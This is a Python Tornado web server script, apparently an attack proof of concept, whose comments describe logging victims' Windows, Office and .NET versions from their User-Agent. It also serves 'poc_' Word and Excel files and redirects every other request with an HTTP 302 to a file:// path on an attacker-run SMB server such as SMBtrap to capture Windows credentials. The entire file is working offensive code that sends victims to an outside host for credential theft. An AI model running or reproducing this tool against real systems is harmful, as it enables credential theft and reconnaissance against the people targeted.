import tornado.ioloop
import tornado.web
import string
import random
import os.path
import sys
#
# This Python script hosts an HTTP server, fulfulling three purposes:
# - Victim host info logging:
#	Logs the User-Agent exposed by the victim machine, including the following host environment info:
#	Windows version, Office version, installed .NET runtime versions, presence of Tablet PC subsystem
# - Redirects the user (HTTP 302) to a malicious SMB server that captures Windows user credentials (e.g. SMBtrap). 
 
try: smbServerAddr = sys.argv[1] # Host running SMBtrap
except: print "Specify IP"
 
class HandleRequest(tornado.web.RequestHandler):
    def get(self):
        print self.request.remote_ip + ": HTTP GET '"+ self.request.path + "'"
        print self.request.remote_ip + ": User-Agent: " + self.request.headers["User-Agent"]
 
        if self.request.path == "/favicon.ico":
            self.set_status(404, "Not Found")
        elif self.request.path.startswith('/poc_'):
            officePocPath = os.getcwd() + self.request.path
 
            if self.request.path.endswith('.docx') == True:
                self.set_header("Content-Type","application/vnd.openxmlformats-officedocument.wordprocessingml.document")
            else:
                self.set_header("Content-Type","application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
 
            if os.path.exists(officePocPath) == True:
                print "  Serving " + self.request.path
 
                with open(officePocPath, 'rb') as f:
                    data = f.read()
                self.write(data)
                self.finish()
 
            else:
                print "  Cannot serve " + self.request.path + ": file not found in script working directory."
        else:
            print "  Sending HTTP 302 file://///" + smbServerAddr +"/some/path"
            self.set_status(302, "Found")
            self.redirect("file://///" + smbServerAddr +"/some/path")
 
 
application = tornado.web.Application([
    (r".*", HandleRequest),
])
 
if __name__ == "__main__":
    import sys
 
    port = 80
    if len(sys.argv) > 2:
        port = int(sys.argv[2])
 
    application.listen(port)
    tornado.ioloop.IOLoop.instance().start()

